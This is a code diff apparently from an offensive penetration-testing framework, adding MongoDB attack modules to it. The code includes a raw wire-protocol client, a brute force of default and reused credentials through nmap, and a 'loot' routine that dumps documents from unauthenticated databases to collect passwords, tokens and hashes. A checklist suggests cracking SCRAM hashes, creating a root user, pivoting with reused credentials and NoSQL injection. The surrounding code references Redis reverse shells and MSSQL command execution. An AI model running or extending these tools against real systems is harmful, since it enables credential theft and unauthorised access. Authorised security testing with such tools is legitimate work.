@@ -2480,6 +2480,42 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"MySQL: {mv.group(1).strip()}"[:140]}
         return None
 
+    # 2bd3) mongo-loot: credential-like fields dumped from collections
+    if sid == "mongo-loot":
+        creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
+        colls = re.findall(r"^· coll ", output, re.M)
+        if creds:
+            shown = "; ".join(c.strip() for c in creds[:2]) + (f" +{len(creds) - 2}" if len(creds) > 2 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"MongoDB creds: {shown}"[:140]}
+        if colls:
+            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
+                    "summary": f"MongoDB: {len(colls)} collection(s) readable unauthenticated"[:140]}
+        return None
+
+    # 2bd2) mongo-auth: default/reused login worked (or no auth needed)
+    if sid == "mongo-auth":
+        if re.search(r"^✗ UNAUTH", output, re.M):
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": "MongoDB: no authentication required (remote read)"[:140]}
+        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
+        if not hits:
+            return None
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"MongoDB creds: {'; '.join(h.strip() for h in hits[:3])}"[:140]}
+
+    # 2bd1) mongo-info: unauthenticated MongoDB (exposed) → else version disclosure (info)
+    if sid == "mongo-info":
+        if re.search(r"^✗ UNAUTH", output, re.M):
+            mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": f"MongoDB unauthenticated: {(mv.group(1).strip() if mv else 'remote read')}"[:140]}
+        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
+        if mv:
+            return {"state": "INFO", "cve": cve, "risk": "LOW",
+                    "summary": f"MongoDB: {mv.group(1).strip()}"[:140]}
+        return None
+
     # 2be6) redis-shell: reverse shell fired through the CONFIG-SET webshell
     if sid == "redis-shell":
         if "shell → " in output:
@@ -3609,10 +3645,10 @@ _EXPLOIT_STEPS = {
         "Manual steps & further research",
     ],
     "mongodb": [
-        "Connect unauthenticated (mongosh); if refused, try default / known creds",
-        "show dbs / show collections; dump interesting collections for creds",
-        "Note version → searchsploit; check for exposed admin / config data",
-        "Manual steps & further research",
+        ("Wire probe (stdlib BSON) → version + role + unauth flag → searchsploit", "mongo-info"),
+        ("If auth required: default + reused creds (nmap mongodb-brute); else unauth", "mongo-auth"),
+        ("Loot: walk DBs/collections, dump docs → creds/tokens (unauth, read-only)", "mongo-loot"),
+        ("Manual steps & further research", "mongo-next"),
     ],
     "couchdb": [
         "GET /_all_dbs and read documents unauthenticated; note version",
@@ -16339,6 +16375,460 @@ def _tool_redis_next(ip: str, port: int, proto: str) -> str:
     return "\n".join(L)
 
 
+# ══ MongoDB (27017 / 27018) ══ there's no mongo/mongosh client on the box, but the wire protocol is
+# BSON over OP_QUERY (legacy) / OP_MSG (3.6+), so a minimal stdlib client covers the high-value path:
+# an unauthenticated MongoDB → list every database/collection and dump documents (creds/tokens). SCRAM
+# auth isn't done in stdlib, so authenticated dumps + default-cred brute go through nmap / mongosh.
+_MONGO_OP_REPLY = 1
+_MONGO_OP_QUERY = 2004
+_MONGO_OP_MSG = 2013
+_MONGO_LOOT_DEADLINE = 90
+_MONGO_JUICY = re.compile(r"pass|pwd|secret|token|cred|hash|key|auth|user|email|login|flag", re.I)
+
+
+def _bson_enc(doc: dict) -> bytes:
+    """Encode a Python dict as a BSON document (the subset of types we ever send)."""
+    import struct
+    body = b""
+    for k, v in doc.items():
+        key = k.encode() + b"\x00"
+        if isinstance(v, bool):
+            body += b"\x08" + key + (b"\x01" if v else b"\x00")
+        elif isinstance(v, int):
+            if -2**31 <= v < 2**31:
+                body += b"\x10" + key + struct.pack("<i", v)
+            else:
+                body += b"\x12" + key + struct.pack("<q", v)
+        elif isinstance(v, float):
+            body += b"\x01" + key + struct.pack("<d", v)
+        elif isinstance(v, str):
+            s = v.encode() + b"\x00"
+            body += b"\x02" + key + struct.pack("<i", len(s)) + s
+        elif isinstance(v, dict):
+            body += b"\x03" + key + _bson_enc(v)
+        elif isinstance(v, list):
+            body += b"\x04" + key + _bson_enc({str(i): x for i, x in enumerate(v)})
+        elif v is None:
+            body += b"\x0a" + key
+    return struct.pack("<i", len(body) + 5) + body + b"\x00"
+
+
+def _bson_read_doc(data: bytes, off: int) -> tuple:
+    """Decode one BSON document starting at off → (dict, next_off)."""
+    import struct
+    size = struct.unpack_from("<i", data, off)[0]
+    end = off + size
+    off += 4
+    doc = {}
+    while off < end - 1:
+        etype = data[off]
+        off += 1
+        kend = data.index(0, off)
+        key = data[off:kend].decode("utf-8", "replace")
+        off = kend + 1
+        val, off = _bson_read_val(data, off, etype)
+        doc[key] = val
+    return doc, end
+
+
+def _bson_read_val(data: bytes, off: int, t: int) -> tuple:
+    """Decode one BSON value of type t at off → (value, next_off)."""
+    import struct
+    if t == 0x01:
+        return struct.unpack_from("<d", data, off)[0], off + 8
+    if t == 0x02:
+        ln = struct.unpack_from("<i", data, off)[0]
+        off += 4
+        return data[off:off + ln - 1].decode("utf-8", "replace"), off + ln
+    if t == 0x03:
+        return _bson_read_doc(data, off)
+    if t == 0x04:
+        d, no = _bson_read_doc(data, off)
+        return [d[k] for k in sorted(d, key=lambda x: int(x) if x.isdigit() else 0)], no
+    if t == 0x05:
+        ln = struct.unpack_from("<i", data, off)[0]
+        off += 4 + 1                                         # length + subtype
+        return f"<binary {ln}B>", off + ln
+    if t == 0x07:
+        return data[off:off + 12].hex(), off + 12           # ObjectId
+    if t == 0x08:
+        return (data[off] != 0), off + 1
+    if t == 0x09:
+        return struct.unpack_from("<q", data, off)[0], off + 8   # UTC datetime (ms)
+    if t == 0x0A:
+        return None, off
+    if t == 0x0B:                                            # regex: two cstrings
+        e1 = data.index(0, off)
+        e2 = data.index(0, e1 + 1)
+        return f"/{data[off:e1].decode('utf-8', 'replace')}/", e2 + 1
+    if t == 0x10:
+        return struct.unpack_from("<i", data, off)[0], off + 4
+    if t in (0x11, 0x12):
+        return struct.unpack_from("<q", data, off)[0], off + 8
+    if t == 0x13:
+        return "<decimal128>", off + 16
+    raise ValueError(f"unsupported bson type {t:#x}")
+
+
+def _mongo_send(ip: str, port: int, payload: bytes, timeout: float) -> bytes:
+    """Send one wire message, read the full reply frame (length-prefixed). Raises on connect failure."""
+    import socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        try:
+            s.connect((ip, port))
+        except OSError as exc:
+            raise RuntimeError(f"no MongoDB on {ip}:{port} ({exc})")
+        s.sendall(payload)
+        hdr = _recv_exact(s, 4)
+        if len(hdr) < 4:
+            return b""
+        import struct
+        mlen = struct.unpack("<i", hdr)[0]
+        return hdr + _recv_exact(s, max(0, mlen - 4))
+    finally:
+        try:
+            s.close()
+        except Exception:                                    # noqa: BLE001
+            pass
+
+
+def _mongo_frame(opcode: int, body: bytes) -> bytes:
+    import struct
+    import os as _os
+    reqid = int.from_bytes(_os.urandom(4), "little") & 0x7fffffff
+    return struct.pack("<iiii", 16 + len(body), reqid, 0, opcode) + body
+
+
+def _mongo_parse(resp: bytes) -> list:
+    """Parse an OP_REPLY / OP_MSG frame → list of BSON documents."""
+    import struct
+    if len(resp) < 16:
+        return []
+    mlen, _rid, _rto, opcode = struct.unpack_from("<iiii", resp, 0)
+    off = 16
+    docs = []
+    try:
+        if opcode == _MONGO_OP_REPLY:
+            _flags, _cur, _start, numret = struct.unpack_from("<iqii", resp, off)
+            off += 20
+            for _ in range(numret):
+                if off >= len(resp):
+                    break
+                d, off = _bson_read_doc(resp, off)
+                docs.append(d)
+        elif opcode == _MONGO_OP_MSG:
+            off += 4                                         # flagBits
+            while off < mlen:
+                kind = resp[off]
+                off += 1
+                if kind == 0:
+                    d, off = _bson_read_doc(resp, off)
+                    docs.append(d)
+                elif kind == 1:
+                    secsize = struct.unpack_from("<i", resp, off)[0]
+                    off += secsize
+                else:
+                    break
+    except (ValueError, struct.error, IndexError):
+        pass
+    return docs
+
+
+def _mongo_cmd(ip: str, port: int, db: str, cmd: dict, timeout: float = 6.0) -> dict:
+    """Run a database command (OP_MSG first, OP_QUERY fallback) → the reply document ({} on failure)."""
+    import struct
+    c = dict(cmd)
+    c["$db"] = db
+    opmsg = _mongo_frame(_MONGO_OP_MSG, struct.pack("<I", 0) + b"\x00" + _bson_enc(c))
+    body = (struct.pack("<i", 0) + (db + ".$cmd").encode() + b"\x00"
+            + struct.pack("<ii", 0, 1) + _bson_enc(cmd))
+    opquery = _mongo_frame(_MONGO_OP_QUERY, body)
+    for payload in (opmsg, opquery):
+        docs = _mongo_parse(_mongo_send(ip, port, payload, timeout))
+        if docs:
+            return docs[0]
+    return {}
+
+
+def _mongo_find(ip: str, port: int, db: str, coll: str, limit: int = 5, timeout: float = 6.0) -> list:
+    """Fetch up to `limit` documents from db.coll (find command, then legacy collection query)."""
+    import struct
+    doc = _mongo_cmd(ip, port, db, {"find": coll, "filter": {}, "limit": limit}, timeout)
+    cur = doc.get("cursor")
+    if isinstance(cur, dict):
+        return cur.get("firstBatch") or []
+    body = (struct.pack("<i", 0) + (db + "." + coll).encode() + b"\x00"
+            + struct.pack("<ii", 0, limit) + _bson_enc({}))
+    return _mongo_parse(_mongo_send(ip, port, _mongo_frame(_MONGO_OP_QUERY, body), timeout))
+
+
+def _mongo_auth_required(doc: dict) -> bool:
+    """True when a command reply says access control is on (Unauthorized / code 13)."""
+    if doc.get("ok") in (0, 0.0):
+        return (doc.get("code") == 13
+                or "requires authentication" in str(doc.get("errmsg", "")).lower()
+                or "unauthorized" in str(doc.get("codeName", "")).lower())
+    return False
+
+
+def _gather_mongo_creds(ip: str) -> list:
+    """(user, pass) MongoDB logins mongo-auth proved for this host ('mongodb on <ip>')."""
+    out = []
+    for sid, output in fetch_scripts(ip, 445, "tcp"):
+        if sid != "smb-creds":
+            continue
+        for m in re.finditer(rf"! (\S+?):(\S*) @ mongodb on {re.escape(ip)}\b", output or ""):
+            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
+    return out
+
+
+def _tool_mongo_info(ip: str, port: int, proto: str) -> str:
+    """MongoDB step 1 tool: speak the wire protocol (stdlib BSON) — buildInfo for the exact version,
+    isMaster/hello for the role, and listDatabases to decide unauthenticated (critical: full read)
+    vs access-controlled. Records the service and runs searchsploit. Read-only. A host that doesn't
+    speak the Mongo wire protocol raises. Authorised targets only."""
+    bi = _mongo_cmd(ip, port, "admin", {"buildInfo": 1})
+    version = str(bi.get("version", "") or "")
+    im = _mongo_cmd(ip, port, "admin", {"isMaster": 1}) or _mongo_cmd(ip, port, "admin", {"hello": 1})
+    ld = _mongo_cmd(ip, port, "admin", {"listDatabases": 1})
+    if not version and not ld and not im:
+        raise RuntimeError(f"{ip}:{port} — no MongoDB wire reply (not Mongo / TLS-only?)")
+    auth_req = _mongo_auth_required(ld)
+
+    lines = []
+    if version:
+        save_services(ip, [{"port": port, "proto": proto, "name": "mongodb",
+                            "product": "MongoDB", "version": version}])
+        role = "primary" if im.get("ismaster") or im.get("isWritablePrimary") else "secondary/arbiter"
+        lines.append(f"[*] Service: MongoDB {version} · {role}")
+    if not auth_req and ld.get("databases") is not None:
+        dbs = [d.get("name") for d in ld.get("databases", []) if d.get("name")]
+        lines.append("✗ UNAUTH — MongoDB serves listDatabases with no authentication (full remote read)")
+        lines.append(f"· databases: {', '.join(dbs[:12])}"
+                     + (f" +{len(dbs) - 12}" if len(dbs) > 12 else ""))
+        lines.append("· loot them (r3) → dump collections for creds/tokens")
+    elif auth_req:
+        lines.append("· authentication required (access control on) — try default creds (mongo-auth r2)")
+    else:
+        lines.append(f"· reachable but listDatabases returned nothing conclusive: {ld.get('errmsg', '')[:80]}")
+
+    if version and shutil.which("searchsploit"):
+        proc = subprocess.run(["searchsploit", "-j", "-s", "-t", "MongoDB", version],
+                              capture_output=True, text=True, timeout=30)
+        try:
+            rows = json.loads(proc.stdout or "{}").get("RESULTS_EXPLOIT", [])
+        except ValueError:
+            rows = []
+        seen = set()
+        for r in rows[:20]:
+            edb = str(r.get("EDB-ID", "?"))
+            if edb in seen:
+                continue
+            seen.add(edb)
+            lines.append(f"[searchsploit] {(r.get('Title') or '').strip()}  (EDB-{edb})")
+            if len(seen) >= 6:
+                break
+    return f"MongoDB INFO — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_mongo_auth(ip: str, port: int, proto: str) -> str:
+    """MongoDB step 2 tool: when access control is on, brute the classic default accounts plus any
+    harvested password (reuse) via nmap mongodb-brute in creds-mode — one password per account, so no
+    lockout. When no auth is required, says so (loot r3 works directly). SCRAM isn't done in stdlib,
+    so validated creds are recorded for a mongosh dump (mongo-next). Authorised targets only."""
+    import tempfile
+    ld = _mongo_cmd(ip, port, "admin", {"listDatabases": 1})
+    if not _mongo_auth_required(ld) and ld.get("databases") is not None:
+        return (f"MongoDB auth — {ip}:{port}\n\n"
+                "✗ UNAUTH — no authentication required (loot r3 works directly)")
+    if not shutil.which("nmap"):
+        raise RuntimeError("nmap required for the MongoDB default-account check (mongodb-brute)")
+
+    defaults = [("admin", "admin"), ("admin", "password"), ("root", "root"), ("admin", ""),
+                ("mongo", "mongo"), ("admin", "123456"), ("sa", "sa"), ("test", "test")]
+    reused = [s for _d, _u, s in _gather_all_smb_creds()
+              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]
+    pairs, seen = [], set()
+    for u, p in defaults + [(u, s) for s in reused for u in ("admin", "root", "mongo")]:
+        if (u.lower(), p) not in seen:
+            seen.add((u.lower(), p))
+            pairs.append((u, p))
+    fd, credfile = tempfile.mkstemp(prefix="pshunter_mongo_", suffix=".txt")
+    with os.fdopen(fd, "w") as fh:
+        fh.write("\n".join(f"{u}/{p}" for u, p in pairs))
+
+    valid = []
+    try:
+        args = f"brute.mode=creds,brute.credfile={credfile},mongodb-brute.db=admin"
+        p = subprocess.run(["nmap", "-Pn", "-p", str(port), "--script", "mongodb-brute",
+                            "--script-args", args, ip], capture_output=True, text=True, timeout=180)
+        for mm in re.finditer(r"([\w.$@-]+):(\S*?) - Valid credentials", p.stdout or ""):
+            valid.append((mm.group(1), mm.group(2)))
+    finally:
+        _safe_unlink(credfile)
+
+    if valid:
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for u, pw in valid:
+            line = f"! {u}:{pw or '<blank>'} @ mongodb on {ip} [{ip}]"
+            blocks.setdefault(ip, [])
+            if line not in blocks[ip]:
+                blocks[ip].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lines = [f"[*] {len(pairs)} pair(s) tried (defaults + reuse) · {len(valid)} valid"]
+    for u, pw in valid:
+        lines.append(f"✗ CREDS {u}:{pw or '<blank>'}")
+    lines.append("· authenticated dump: mongosh (see mongo-next r4) — stdlib can't SCRAM" if valid
+                 else "· no default/reused login worked — reuse app-config creds, or NoSQL-inject the app")
+    return f"MongoDB auth — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_mongo_loot(ip: str, port: int, proto: str) -> str:
+    """MongoDB step 3 tool: against an unauthenticated instance, walk every non-system database and
+    collection and dump the first documents, surfacing credential-like fields (password/token/hash/…).
+    Read-only (find, limit-bounded). SCRAM auth isn't done in stdlib, so an access-controlled server
+    raises with the mongosh path. Authorised targets only."""
+    ld = _mongo_cmd(ip, port, "admin", {"listDatabases": 1})
+    if _mongo_auth_required(ld):
+        raise RuntimeError("auth required — no stdlib SCRAM; dump with mongosh -u <user> -p (mongo-auth r2 / mongo-next)")
+    if ld.get("databases") is None:
+        raise RuntimeError("listDatabases returned nothing — run mongo-info (r1) first")
+
+    alldbs = [d.get("name") for d in ld.get("databases", []) if d.get("name")]
+    userdbs = [d for d in alldbs if d not in ("admin", "local", "config")] or alldbs
+    deadline = time.time() + _MONGO_LOOT_DEADLINE
+    creds, colls_seen = [], []
+    for db in userdbs[:10]:
+        if time.time() > deadline:
+            break
+        lc = _mongo_cmd(ip, port, db, {"listCollections": 1, "nameOnly": True})
+        colls = [c.get("name") for c in lc.get("cursor", {}).get("firstBatch", []) if c.get("name")]
+        for coll in colls[:15]:
+            if time.time() > deadline:
+                break
+            colls_seen.append(f"{db}.{coll}")
+            for doc in _mongo_find(ip, port, db, coll, limit=5):
+                if not isinstance(doc, dict):
+                    continue
+                for k, v in doc.items():
+                    if isinstance(v, dict):
+                        for k2, v2 in v.items():
+                            if _MONGO_JUICY.search(k2) and v2 not in (None, "", {}):
+                                creds.append(f"{db}.{coll}: {k}.{k2}={str(v2)[:50]}")
+                    elif _MONGO_JUICY.search(k) and v not in (None, "", {}, []):
+                        creds.append(f"{db}.{coll}: {k}={str(v)[:60]}")
+
+    seen, uniq = set(), []
+    for c in creds:
+        if c not in seen:
+            seen.add(c)
+            uniq.append(c)
+    lines = [f"[*] {len(userdbs)} db(s) · {len(colls_seen)} collection(s) sampled · {len(uniq)} field(s) of interest"]
+    for c in uniq[:30]:
+        lines.append(f"✗ CRED {c}")
+    for cn in colls_seen[:25]:
+        if not any(cn in u for u in uniq):
+            lines.append(f"· coll {cn}")
+    if not uniq:
+        lines.append("· no credential-like fields in the sampled docs — dump full collections manually")
+    return f"MongoDB loot — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+# ── MongoDB step 4: manual steps & further research (reference only, context-aware) ─
+def _tool_mongo_next(ip: str, port: int, proto: str) -> str:
+    """MongoDB step-4 tool: NOT a scan — a read-only checklist of where to go on MongoDB (authenticated
+    dump, users, server-side JS, NoSQL injection, reuse), with this host's findings substituted in
+    (version, databases, looted creds, validated logins, unconfirmed ⚠). Pure DB synthesis; no network."""
+    scripts = fetch_scripts(ip, port, proto)
+    by_sid = {}
+    for sid, out in scripts:
+        by_sid.setdefault(sid, out or "")
+    info, loot = by_sid.get("mongo-info", ""), by_sid.get("mongo-loot", "")
+
+    mv = re.search(r"^\[\*\] Service:\s*(.+)$", info, re.M)
+    ver = mv.group(1).split("·")[0].strip() if mv else ""
+    unauth = "✗ UNAUTH" in info
+    md = re.search(r"^· databases:\s*(.+)$", info, re.M)
+    dbs = md.group(1) if md else ""
+    looted = re.findall(r"^✗ CRED (.+)$", loot, re.M)
+    creds = _gather_mongo_creds(ip)
+    cred1 = f"{creds[0][0]}:{creds[0][1]}" if creds else "<user>:<pass>"
+
+    oports = {(p, pr) for p, pr, _s in fetch_ports(ip)}
+    reuse_svc = [n for (pnum, n) in ((22, "SSH"), (445, "SMB"), (80, "web-login"))
+                 if (pnum, "tcp") in oports]
+
+    kev = _load_kev()
+    found = set()
+    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
+        if p == port and pr == proto and cv:
+            found |= {c.strip() for c in cv.split(",") if c.strip()}
+    for _sid, out in scripts:
+        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
+    found = sorted(found, key=_cve_sort_key)
+
+    warns = []
+    for sid, out in scripts:
+        for ln in (out or "").splitlines():
+            if ln.strip().startswith("⚠"):
+                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
+    warns = warns[:14]
+
+    sub = (f"{DIM}version: {ver or 'unknown'}  ·  unauth: {'yes' if unauth else 'no'}  ·  "
+           f"looted fields: {len(looted)}  ·  creds: {len(creds)}")
+    L = [f"MongoDB {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET]
+
+    L.append(f"\n{BOLD}A. Dump everything{RESET}")
+    if unauth:
+        L.append(f"  {CYAN}unauthenticated{RESET} {DIM}→ mongosh mongodb://{ip}:{port}/ then db.getCollectionNames(), "
+                 f"db.<coll>.find(); or mongodump --host {ip} --port {port} -o loot/{RESET}")
+    elif creds:
+        L.append(f"  {CYAN}cred{RESET} {DIM}→ mongosh 'mongodb://{cred1}@{ip}:{port}/?authSource=admin'; "
+                 f"mongodump -u … -p … --authenticationDatabase admin{RESET}")
+    else:
+        L.append(f"  {DIM}get in first — default creds (mongo-auth r2) or app config; then mongosh/mongodump{RESET}")
+
+    L.append(f"\n{BOLD}B. Users & privilege{RESET}")
+    L.append(f"  {DIM}db.getSiblingDB('admin').system.users.find() / usersInfo → SCRAM-SHA hashes "
+             f"(hashcat -m 24100/24200); create a root user if you have userAdmin{RESET}")
+
+    L.append(f"\n{BOLD}C. Reuse & pivot{RESET}")
+    if looted:
+        L.append(f"  {CYAN}{len(looted)} looted field(s){RESET} {DIM}→ crack/reuse on "
+                 f"{', '.join(reuse_svc) or 'SSH / web-login'}; app connection strings → other DBs{RESET}")
+    else:
+        L.append(f"  {DIM}nothing looted yet — mongo-loot (r3) on the unauth instance{RESET}")
+    if dbs:
+        L.append(f"  {DIM}databases: {dbs}{RESET}")
+
+    L.append(f"\n{BOLD}D. Code exec paths (rare / version-gated){RESET}")
+    L.append(f"  {DIM}server-side JS if enabled: $where / mapReduce / db.eval (removed in 4.2+); "
+             f"NoSQL injection in the app ($ne/$gt/$regex) → authN bypass & data exfil{RESET}")
+
+    L.append(f"\n{BOLD}E. CVEs surfaced in this phase{RESET}")
+    if found:
+        for c in found:
+            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
+            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
+    else:
+        L.append(f"  {DIM}none surfaced — searchsploit '{ver or 'MongoDB <version>'}'; check for exposed "
+                 f"admin without auth (the finding itself){RESET}")
+
+    L.append(f"\n{BOLD}F. Verify unconfirmed findings from this phase{RESET}")
+    if warns:
+        for w in warns:
+            L.append(f"  {w}")
+    else:
+        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")
+
+    L.append(f"\n{BOLD}G. Re-run & housekeeping{RESET}")
+    L.append(f"  {DIM}crack any SCRAM hashes then reuse; if you created a user for access, drop it when done{RESET}")
+    return "\n".join(L)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -16521,6 +17011,10 @@ _STEP_TOOLS = {
     "redis-rce": ("Redis CONFIG SET webshell → exec-verified RCE (stdlib + HTTP verify)", _tool_redis_rce),
     "redis-shell": ("Redis foothold → reverse shell via the webshell (spawned)", _tool_redis_shell),
     "redis-next": ("manual Redis steps (context-aware, reference only)", _tool_redis_next),
+    "mongo-info": ("MongoDB wire probe (stdlib BSON) → version, role, unauth flag", _tool_mongo_info),
+    "mongo-auth": ("MongoDB default/reused creds (nmap mongodb-brute, no lockout)", _tool_mongo_auth),
+    "mongo-loot": ("MongoDB loot → walk DBs/collections, dump docs for creds (unauth)", _tool_mongo_loot),
+    "mongo-next": ("manual MongoDB steps (context-aware, reference only)", _tool_mongo_next),
     "mssql-banner": ("MSSQL fingerprint — SQL Browser 1434 / TDS pre-login → version (stdlib)", _tool_mssql_banner),
     "mssql-creds": ("sa blank/default + reused creds (netexec mssql, flags sysadmin)", _tool_mssql_creds),
     "mssql-exec": ("xp_cmdshell command exec confirm (netexec -x, sysadmin)", _tool_mssql_exec),
@@ -16643,6 +17137,10 @@ _STEP_TOOL_RUNS = {
     "redis-rce":        ("Python (RESP) + HTTP verify", None),
     "redis-shell":      ("Python (smart listener)", None),
     "redis-next":       ("reference · no scan", None),
+    "mongo-info":       ("Python (BSON wire) + searchsploit", None),
+    "mongo-auth":       ("nmap mongodb-brute", None),
+    "mongo-loot":       ("Python (BSON wire)", f"{_mins(_MONGO_LOOT_DEADLINE)} min"),
+    "mongo-next":       ("reference · no scan", None),
     "mssql-banner":     ("Python (stdlib) + searchsploit", None),
     "mssql-creds":      ("netexec mssql", f"{_mins(_MSSQLCREDS_DEADLINE)} min"),
     "mssql-exec":       ("netexec mssql -x", None),
@@ -16736,7 +17234,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next", "redis-next"):  # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next", "redis-next", "mongo-next"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
@@ -16745,7 +17243,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
             print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
             set_step_status(ip, port, proto, key, n, prev)
             return
-        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next", "redis-next"):  # a list to read now, not a scan result
+        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next", "redis-next", "mongo-next"):  # a list to read now, not a scan result
             print("\n" + out)
             out = re.sub(r"\x1b\[[0-9;]*m", "", out)           # store clean text (no ANSI) in DETAILS
         save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
